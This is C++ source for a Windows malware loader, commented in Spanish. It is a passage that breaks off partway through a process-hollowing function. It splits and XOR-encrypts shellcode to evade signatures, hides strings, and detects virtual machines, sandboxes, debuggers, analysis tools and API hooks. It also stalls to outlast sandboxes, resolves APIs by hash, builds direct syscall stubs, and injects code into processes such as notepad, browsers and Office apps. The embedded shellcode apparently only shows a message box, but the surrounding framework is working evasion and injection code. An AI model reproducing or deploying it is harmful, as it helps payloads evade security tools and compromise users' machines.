#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <cstring>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <wbemidl.h>
#include <oleauto.h>
#include <comdef.h>
#include <setupapi.h>
#include <devguid.h>
#include <cfgmgr32.h>
#include <array>
#include <winternl.h>
#include <vector>
#include <random>
#include <algorithm>

struct APIAddresses {
    // kernel32.dll
    HMODULE(WINAPI *LoadLibraryA)(LPCSTR);
    FARPROC(WINAPI *GetProcAddress)(HMODULE, LPCSTR);
    LPVOID(WINAPI *VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    BOOL(WINAPI *VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
    HANDLE(WINAPI *CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    DWORD(WINAPI *WaitForSingleObject)(HANDLE, DWORD);
    BOOL(WINAPI *CloseHandle)(HANDLE);
    HANDLE(WINAPI *CreateToolhelp32Snapshot)(DWORD, DWORD);
    BOOL(WINAPI *Process32First)(HANDLE, LPPROCESSENTRY32);
    BOOL(WINAPI *Process32Next)(HANDLE, LPPROCESSENTRY32);
    HANDLE(WINAPI *OpenProcess)(DWORD, BOOL, DWORD);
    LPVOID(WINAPI *VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    BOOL(WINAPI *WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    HANDLE(WINAPI *CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    BOOL(WINAPI *VirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
    VOID(WINAPI *GetSystemInfo)(LPSYSTEM_INFO);
    BOOL(WINAPI *GlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
    DWORD(WINAPI *GetTickCount)(void);
    HMODULE(WINAPI *GetModuleHandleA)(LPCSTR);
    BOOL(WINAPI *IsDebuggerPresent)(void);
    BOOL(WINAPI *CheckRemoteDebuggerPresent)(HANDLE, PBOOL);
    BOOL(WINAPI *QueryPerformanceCounter)(LARGE_INTEGER*);
    BOOL(WINAPI *QueryPerformanceFrequency)(LARGE_INTEGER*);
    DWORD(WINAPI *GetLastError)(void);
    BOOL(WINAPI *GetExitCodeThread)(HANDLE, LPDWORD);
    BOOL(WINAPI *VirtualFree)(LPVOID, SIZE_T, DWORD);
    // Nuevas APIs para Process Hollowing
    BOOL(WINAPI *CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    BOOL(WINAPI *GetThreadContext)(HANDLE, PCONTEXT);
    BOOL(WINAPI *SetThreadContext)(HANDLE, const CONTEXT*);
    BOOL(WINAPI *ReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
    DWORD(WINAPI *ResumeThread)(HANDLE);
    BOOL(WINAPI *TerminateProcess)(HANDLE, UINT);
    // Nuevas APIs para elevacion de privilegios
    BOOL(WINAPI *OpenProcessToken)(HANDLE, DWORD, PHANDLE);
    BOOL(WINAPI *DuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
    BOOL(WINAPI * CreateProcessWithTokenW)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    //UINT(WINAPI *GetSystemDirectoryA)(LPSTR, UINT);
    // user32.dll
    int(WINAPI *MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
    // ntdll.dll
    NTSTATUS(NTAPI *NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NTSTATUS(NTAPI *NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
};
APIAddresses APIs;

constexpr std::array<unsigned char, 16> encryptionKeyTC = {
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11, 0x22,
    0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99
};

constexpr auto encrypt_string(const char* str, size_t len){
    std::array<unsigned char, 256> encrypted{};
    for (size_t i = 0; i < len && i < encrypted.size(); ++i){
        encrypted[i] = static_cast<unsigned char>(str[i]) ^ encryptionKeyTC[i % encryptionKeyTC.size()];
    }
    return encrypted;
}

template <size_t N>
class EncryptedString {
private:
    const std::array<unsigned char, N> encrypted_data;
    
public:
    constexpr EncryptedString(const std::array<unsigned char, N>& data) 
        : encrypted_data(data) {}
    
    const char* decrypt() const {
        static thread_local char buffer[N + 1];
        for (size_t i = 0; i < N; ++i) {
            buffer[i] = encrypted_data[i] ^ encryptionKeyTC[i % encryptionKeyTC.size()];
        }
        buffer[N] = '\0';
        return buffer;
    }
    
    operator const char*() const {
        return decrypt();
    }
};

#define ENC_STR(str) []() { \
    constexpr auto encrypted = encrypt_string(str, sizeof(str) - 1); \
    constexpr EncryptedString<encrypted.size()> es(encrypted); \
    return es; \
}()

// Shellcode en claro (dividido en múltiples partes para evadir firmas)
unsigned char part1[] = { 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41 };
unsigned char part2[] = { 0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x56,0x65,0x48,0x8b,0x52,0x60 };
unsigned char part3[] = { 0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f };
unsigned char part4[] = { 0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02 };
unsigned char part5[] = { 0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b };
unsigned char part6[] = { 0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02 };
unsigned char part7[] = { 0x41,0x51,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00 };
unsigned char part8[] = { 0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x44,0x8b,0x40,0x20,0x8b };
unsigned char part9[] = { 0x48,0x18,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88 };
unsigned char part10[] = { 0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d };
unsigned char part11[] = { 0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39 };
unsigned char part12[] = { 0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b };
unsigned char part13[] = { 0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48 };
unsigned char part14[] = { 0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41 };
unsigned char part15[] = { 0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48 };
unsigned char part16[] = { 0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,0x00,0x75 };
unsigned char part17[] = { 0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x59,0x41,0xba,0x4c };
unsigned char part18[] = { 0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0xe8,0x0b };
unsigned char part19[] = { 0x00,0x00,0x00,0x48,0x6f,0x6c,0x61,0x20,0x4d,0x75,0x6e,0x64,0x6f,0x00 };
unsigned char part20[] = { 0x5a,0xe8,0x07,0x00,0x00,0x00,0x53,0x61,0x6c,0x75,0x64,0x6f,0x00,0x41 };
unsigned char part21[] = { 0x58,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31 };
unsigned char part22[] = { 0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

// Clave para encriptar/desencriptar el shellcode
const unsigned char encryptionKey[] = { 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11 };

// Funcion para encriptar/desencriptar datos usando XOR simple
void XorCrypt(unsigned char* data, size_t size, const unsigned char* key, size_t keySize) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % keySize];
    }
}

// Funcion para verificar si se está ejecutando en una máquina virtual
bool IsRunningInVM() {
    SYSTEM_INFO si = { 0 };
    GetSystemInfo(&si);
    
    // Verificar número de procesadores
    if (si.dwNumberOfProcessors < 2) {
        return true;
    }
    
    // Verificar cantidad de RAM
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    if (GlobalMemoryStatusEx(&memStatus)) {
        if (memStatus.ullTotalPhys < 2147483648ULL) { // 2GB
            return true;
        }
    }
    
    // Verificar dispositivos virtuales comunes
    HDEVINFO hDevInfo = SetupDiGetClassDevsA(NULL, "PCI", NULL, DIGCF_PRESENT | DIGCF_ALLCLASSES);
    if (hDevInfo != INVALID_HANDLE_VALUE) {
        SP_DEVINFO_DATA deviceInfoData;
        deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
        
        for (DWORD i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &deviceInfoData); i++) {
            char buffer[4096];
            if (SetupDiGetDeviceRegistryPropertyA(hDevInfo, &deviceInfoData, SPDRP_HARDWAREID, NULL, 
                                                (PBYTE)buffer, sizeof(buffer), NULL)) {
                // Usar cadenas cifradas
                if (strstr(buffer, ENC_STR("VBOX")) || 
                    strstr(buffer, ENC_STR("VMWARE")) || 
                    strstr(buffer, ENC_STR("VIRTUAL")) || 
                    strstr(buffer, ENC_STR("QEMU")) || 
                    strstr(buffer, ENC_STR("XEN")) || 
                    strstr(buffer, ENC_STR("BOCHS"))) {
                    SetupDiDestroyDeviceInfoList(hDevInfo);
                    return true;
                }
            }
        }
        SetupDiDestroyDeviceInfoList(hDevInfo);
    }
    
    return false;
}

// Funcion para verificar si se está ejecutando en un sandbox
bool IsRunningInSandbox() {
    // Verificar tiempo de actividad del sistema
    DWORD uptime = GetTickCount();
    if (uptime < 600000) { // Menos de 10 minutos
        return true;
    }
    
    // Verificar procesos relacionados con análisis
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(snapshot, &pe32)) {
            do {
                // Usar cadenas cifradas para comparacion
                if (_stricmp(pe32.szExeFile, ENC_STR("vmsrvc.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("vmusrvc.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("vmtoolsd.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("vmwaretray.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("vmwareuser.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("vboxservice.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("vboxtray.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("procexp.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("procexp64.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("wireshark.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("fiddler.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("httpdebuggerui.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("processhacker.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("sysinternals.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("dumpcap.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("idag.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("idaq.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("idaq64.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("ollydbg.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("x64dbg.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("windbg.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("joeboxserver.exe")) == 0 ||
                    _stricmp(pe32.szExeFile, ENC_STR("joeboxcontrol.exe")) == 0) {
                    CloseHandle(snapshot);
                    return true;
                }
            } while (Process32Next(snapshot, &pe32));
        }
        CloseHandle(snapshot);
    }
    
    // Verificar archivos comunes en sandboxes
    if (GetFileAttributesA(ENC_STR("C:\\tools\\")) != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA(ENC_STR("C:\\analysis\\")) != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA(ENC_STR("C:\\sample.exe")) != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA(ENC_STR("C:\\malware.exe")) != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA(ENC_STR("C:\\virus.exe")) != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA(ENC_STR("C:\\sandbox\\")) != INVALID_FILE_ATTRIBUTES) {
        return true;
    }
    
    return false;
}

// Funcion para verificar si hay un depurador adjunto
bool IsDebuggerPresentCustom() {
    return ::IsDebuggerPresent() != FALSE;
}

// Funcion para verificar si hay un depurador mediante el bloqueo de memoria
bool CheckRemoteDebuggerPresent() {
    HANDLE hProcess = GetCurrentProcess();
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(hProcess, &debuggerPresent);
    return debuggerPresent != FALSE;
}

// Funcion para detectar hooks de API
bool DetectAPIHooks() {
    // Verificar si hay hooks en funciones críticas
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (hNtDll) {
        FARPROC pNtAllocateVirtualMemory = GetProcAddress(hNtDll, "NtAllocateVirtualMemory");
        if (pNtAllocateVirtualMemory) {
            BYTE* pBytes = (BYTE*)pNtAllocateVirtualMemory;
            
            // Los primeros bytes de NtAllocateVirtualMemory deberían ser:
            // mov r10, rcx (4C 8B D1)
            // mov eax, syscallNumber (B8 XX XX XX XX)
            if (pBytes[0] != 0x4C || pBytes[1] != 0x8B || pBytes[2] != 0xD1) {
                return true; // Hook detectado
            }
        }
    }
    
    return false;
}

// Funcion para retrasar la ejecucion con técnicas anti-sandbox
void AntiSandboxDelay() {
    // Retraso aleatorio entre 30-60 segundos
    DWORD delay = 30000 + (rand() % 30000);
    
    // Usar diferentes métodos de espera para evadir deteccion
    LARGE_INTEGER frequency, startTime, endTime;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&startTime);
    
    do {
        // Mezclar diferentes métodos de espera
        Sleep(100);
        
        // Operaciones inútiles para consumir tiempo
        volatile int junk = 0;
        for (int i = 0; i < 1000; i++) {
            junk += i;
        }
        
        // Verificar tiempo transcurrido
        QueryPerformanceCounter(&endTime);
        LONGLONG elapsed = (endTime.QuadPart - startTime.QuadPart) * 1000 / frequency.QuadPart;
        
        // Si el tiempo transcurrido es mayor que el retraso deseado, salir
        if (elapsed >= delay) {
            break;
        }
        
        // Verificar periodicamente si estamos en un sandbox
        if (IsRunningInSandbox() || IsRunningInVM()) {
            // Si detectamos sandbox, aumentar el retraso
            delay += 60000; // Añadir 60 segundos más
        }
        
    } while (true);
}

// Calcular el tamaño total del shellcode sumando todas las partes
const DWORD CalculateShellcodeSize() {
    return sizeof(part1) + sizeof(part2) + sizeof(part3) + sizeof(part4) + 
           sizeof(part5) + sizeof(part6) + sizeof(part7) + sizeof(part8) + 
           sizeof(part9) + sizeof(part10) + sizeof(part11) + sizeof(part12) + 
           sizeof(part13) + sizeof(part14) + sizeof(part15) + sizeof(part16) + 
           sizeof(part17) + sizeof(part18) + sizeof(part19) + sizeof(part20) + 
           sizeof(part21) + sizeof(part22);
}

// Funcion para combinar partes del shellcode
void CombineShellcode(unsigned char* output) {
    size_t offset = 0;
    
    memcpy(output + offset, part1, sizeof(part1));
    offset += sizeof(part1);
    
    memcpy(output + offset, part2, sizeof(part2));
    offset += sizeof(part2);
    
    memcpy(output + offset, part3, sizeof(part3));
    offset += sizeof(part3);
    
    memcpy(output + offset, part4, sizeof(part4));
    offset += sizeof(part4);
    
    memcpy(output + offset, part5, sizeof(part5));
    offset += sizeof(part5);
    
    memcpy(output + offset, part6, sizeof(part6));
    offset += sizeof(part6);
    
    memcpy(output + offset, part7, sizeof(part7));
    offset += sizeof(part7);
    
    memcpy(output + offset, part8, sizeof(part8));
    offset += sizeof(part8);
    
    memcpy(output + offset, part9, sizeof(part9));
    offset += sizeof(part9);
    
    memcpy(output + offset, part10, sizeof(part10));
    offset += sizeof(part10);
    
    memcpy(output + offset, part11, sizeof(part11));
    offset += sizeof(part11);
    
    memcpy(output + offset, part12, sizeof(part12));
    offset += sizeof(part12);
    
    memcpy(output + offset, part13, sizeof(part13));
    offset += sizeof(part13);
    
    memcpy(output + offset, part14, sizeof(part14));
    offset += sizeof(part14);
    
    memcpy(output + offset, part15, sizeof(part15));
    offset += sizeof(part15);
    
    memcpy(output + offset, part16, sizeof(part16));
    offset += sizeof(part16);
    
    memcpy(output + offset, part17, sizeof(part17));
    offset += sizeof(part17);
    
    memcpy(output + offset, part18, sizeof(part18));
    offset += sizeof(part18);
    
    memcpy(output + offset, part19, sizeof(part19));
    offset += sizeof(part19);
    
    memcpy(output + offset, part20, sizeof(part20));
    offset += sizeof(part20);
    
    memcpy(output + offset, part21, sizeof(part21));
    offset += sizeof(part21);
    
    memcpy(output + offset, part22, sizeof(part22));
    offset += sizeof(part22);
}

// Obtener direccion de funcion usando hashing en lugar de nombres
FARPROC GetProcAddressByHash(HMODULE module, DWORD functionHash) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)module + dosHeader->e_lfanew);
    
    DWORD exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)module + exportDirRva);
    
    PDWORD functionsRva = (PDWORD)((DWORD_PTR)module + exportDir->AddressOfFunctions);
    PDWORD namesRva = (PDWORD)((DWORD_PTR)module + exportDir->AddressOfNames);
    PWORD ordinals = (PWORD)((DWORD_PTR)module + exportDir->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        LPCSTR functionName = (LPCSTR)((DWORD_PTR)module + namesRva[i]);
        
        // Calcular hash del nombre de la funcion
        DWORD hash = 0;
        for (int j = 0; functionName[j]; j++) {
            hash = (hash * 0x1003f) + functionName[j];
        }
        
        if (hash == functionHash) {
            DWORD functionRva = functionsRva[ordinals[i]];
            return (FARPROC)((DWORD_PTR)module + functionRva);
        }
    }
    return NULL;
}

// Syscall stub dinámico
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

NTSTATUS DynamicSyscall(DWORD syscallNumber, HANDLE ProcessHandle, PVOID* BaseAddress, 
                       ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    // Construir syscall stub dinámico
    BYTE syscallStub[] = {
        0x4C, 0x8B, 0xD1,               // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, syscallNumber
        0x0F, 0x05,                     // syscall
        0xC3                            // ret
    };
    
    // Insertar número de syscall
    *(DWORD*)(syscallStub + 5) = syscallNumber;
    
    // Ejecutar stub
    NTSTATUS result;
    void* execMem = VirtualAlloc(NULL, sizeof(syscallStub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        return GetLastError();
    }
    
    memcpy(execMem, syscallStub, sizeof(syscallStub));
    
    typedef NTSTATUS(*SyscallFunc)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    SyscallFunc syscallFunc = (SyscallFunc)execMem;
    result = syscallFunc(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
    
    VirtualFree(execMem, 0, MEM_RELEASE);
    return result;
}

// Funcion para inyectar en un proceso legítimo con manejo de permisos
bool InjectIntoProcess(unsigned char* shellcode, DWORD size) {
    // Lista de procesos objetivo ordenados por prioridad (menos a más sospechosos)
    const char* targetProcesses[] = {
        "notepad.exe", "mspaint.exe", "write.exe", "winword.exe", "excel.exe",
        "chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe", 
    };
    
    HANDLE snapshot = APIs.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateToolhelp32Snapshot failed: " << APIs.GetLastError() << std::endl;
        return false;
    }
    
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(processEntry);
    
    bool injectionSuccess = false;
    
    if (APIs.Process32First(snapshot, &processEntry)) {
        do {
            for (const char* target : targetProcesses) {
                if (_stricmp(processEntry.szExeFile, target) == 0) {
                    std::cout << "Proceso encontrado: " << processEntry.szExeFile << " (PID: " << processEntry.th32ProcessID << ")" << std::endl;
                    
                    // Intentar abrir el proceso con permisos adecuados
                    HANDLE process = NULL;
                    
                    // Primero intentar con permisos básicos
                    process = APIs.OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, processEntry.th32ProcessID);
                    
                    // Si falla, intentar con permisos más amplios (requiere admin)
                    if (!process) {
                        process = APIs.OpenProcess(PROCESS_ALL_ACCESS, FALSE, processEntry.th32ProcessID);
                    }
                    
                    if (!process) {
                        DWORD error = APIs.GetLastError();
                        std::cerr << "OpenProcess failed for " << processEntry.szExeFile << ": " << error << std::endl;
                        continue;
                    }
                    
                    std::cout << "Proceso abierto exitosamente" << std::endl;
                    
                    // Desencriptar el shellcode antes de inyectarlo
                    unsigned char* decryptedShellcode = new unsigned char[size];
                    memcpy(decryptedShellcode, shellcode, size);
                    XorCrypt(decryptedShellcode, size, encryptionKey, sizeof(encryptionKey));
                    
                    // Asignar memoria en el proceso remoto
                    LPVOID remoteMem = APIs.VirtualAllocEx(process, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (!remoteMem) {
                        std::cerr << "VirtualAllocEx failed: " << APIs.GetLastError() << std::endl;
                        delete[] decryptedShellcode;
                        APIs.CloseHandle(process);
                        continue;
                    }
                    
                    std::cout << "Memoria asignada en proceso remoto: " << remoteMem << std::endl;
                    
                    // Escribir shellcode DESENCRIPTADO en el proceso remoto
                    if (!APIs.WriteProcessMemory(process, remoteMem, decryptedShellcode, size, NULL)) {
                        std::cerr << "WriteProcessMemory failed: " << APIs.GetLastError() << std::endl;
                        APIs.VirtualFreeEx(process, remoteMem, 0, MEM_RELEASE);
                        delete[] decryptedShellcode;
                        APIs.CloseHandle(process);
                        continue;
                    }
                    
                    std::cout << "Shellcode escrito en proceso remoto" << std::endl;
                    
                    // Crear hilo remoto
                    HANDLE thread = APIs.CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
                    if (!thread) {
                        std::cerr << "CreateRemoteThread failed: " << APIs.GetLastError() << std::endl;
                        APIs.VirtualFreeEx(process, remoteMem, 0, MEM_RELEASE);
                        delete[] decryptedShellcode;
                        APIs.CloseHandle(process);
                        continue;
                    }
                    
                    std::cout << "Hilo remoto creado exitosamente" << std::endl;
                    
                    // Esperar a que el hilo termine (aumentar el tiempo de espera)
                    APIs.WaitForSingleObject(thread, 15000); // Esperar 15 segundos
                    
                    // Obtener el codigo de salida del hilo
                    DWORD exitCode;
                    if (APIs.GetExitCodeThread(thread, &exitCode)) {
                        std::cout << "El hilo remoto termino con codigo: " << exitCode << std::endl;
                    }
                    
                    // NO liberar la memoria remota aquí, ya que podría ser necesaria
                    // para el funcionamiento del shellcode después de que el hilo termine
                    // Solo cerrar el handle del hilo
                    APIs.CloseHandle(thread);
                    APIs.CloseHandle(process);
                    
                    // Liberar memoria temporal del shellcode desencriptado
                    delete[] decryptedShellcode;
                    
                    injectionSuccess = true;
                    break;
                }
            }
            
            if (injectionSuccess) {
                break;
            }
        } while (APIs.Process32Next(snapshot, &processEntry));
    } else {
        std::cerr << "Process32First failed: " << APIs.GetLastError() << std::endl;
    }
    
    APIs.CloseHandle(snapshot);
    return injectionSuccess;
}
bool GetProcessImageBase(HANDLE hProcess, PVOID* pImageBase) {
    // Obtener dirección del PEB usando NtQueryInformationProcess
    if (!APIs.NtQueryInformationProcess) {
        std::cerr << "NtQueryInformationProcess not available" << std::endl;
        return false;
    }
    
    PROCESS_BASIC_INFORMATION pbi;
    NTSTATUS status = APIs.NtQueryInformationProcess(
        hProcess, 
        ProcessBasicInformation, 
        &pbi, 
        sizeof(pbi), 
        NULL);
    
    if (status != 0) {
        std::cerr << "NtQueryInformationProcess failed: " << status << std::endl;
        return false;
    }
    
    // Leer la dirección base de la imagen desde el PEB
    // En x64, ImageBaseAddress está en offset 0x10 del PEB
    // En x86, está en offset 0x08
#ifdef _WIN64
    const DWORD_PTR imageBaseOffset = 0x10;
#else
    const DWORD_PTR imageBaseOffset = 0x08;
#endif
    PVOID imageBase;
    SIZE_T bytesRead = 0;
    
    if (!APIs.ReadProcessMemory(
        hProcess, 
        (LPCVOID)((DWORD_PTR)pbi.PebBaseAddress + imageBaseOffset), 
        &imageBase, 
        sizeof(PVOID), 
        &bytesRead) || 
        bytesRead != sizeof(PVOID)) {
        
        std::cerr << "ReadProcessMemory (PEB ImageBase) failed: " << APIs.GetLastError() << std::endl;
        return false;
    }
    
    *pImageBase = imageBase;
    return true;
}

// Process Hollowing
bool ProcessHollowing(unsigned char* shellcode, DWORD shellcodeSize) {
    // Lista de procesos objetivo ordenados por prioridad
    const char* targetProcesses[] = {
        "notepad.exe", "mspaint.exe", "write.exe", "winword.exe", "excel.exe",
        "chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe"
    };
    
    // Ruta completa del ejecutable objetivo (usaremos notepad.exe como ejemplo)
    char systemPath[MAX_PATH];
    GetSystemDirectoryA(systemPath, MAX_PATH);
    strcat_s(systemPath, MAX_PATH, "\\notepad.exe");
    
    // Estructuras para la creación del proceso
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi = { 0 };
    
    // Crear el proceso en estado suspendido
    if (!CreateProcessA(
        systemPath,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi)) {
        std::cerr << "CreateProcessA failed: " << GetLastError() << std::endl;
        return false;
    }
    
    std::cout << "Proceso creado en estado suspendido (PID: " << pi.dwProcessId << ")" << std::endl;
    
    // Obtener la dirección base de la imagen del proceso
    PVOID imageBaseAddress;
    if (!GetProcessImageBase(pi.hProcess, &imageBaseAddress)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }
    
    std::cout << "Direccion base de la imagen: " << imageBaseAddress << std::endl;
    
    // Leer la cabecera PE del proceso
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)malloc(sizeof(IMAGE_DOS_HEADER));
    SIZE_T bytesRead = 0;
    
    if (!ReadProcessMemory(pi.hProcess, imageBaseAddress, pDosHeader, sizeof(IMAGE_DOS_HEADER), &bytesRead) || 
        bytesRead != sizeof(IMAGE_DOS_HEADER)) {
        std::cerr << "ReadProcessMemory (DOS header) failed: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(pDosHeader);
        return false;
    }
    
    // Verificar la firma MZ
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "Invalid DOS signature (0x" << std::hex << pDosHeader->e_magic << ")" << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(pDosHeader);
        return false;
    }
    
    // Leer la cabecera PE
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)malloc(sizeof(IMAGE_NT_HEADERS));
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)((DWORD_PTR)imageBaseAddress + pDosHeader->e_lfanew), 
                          pNtHeaders, sizeof(IMAGE_NT_HEADERS), &bytesRead) || 
        bytesRead != sizeof(IMAGE_NT_HEADERS)) {
        std::cerr << "ReadProcessMemory (NT headers) failed: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(pDosHeader);
        free(pNtHeaders);
        return false;
    }
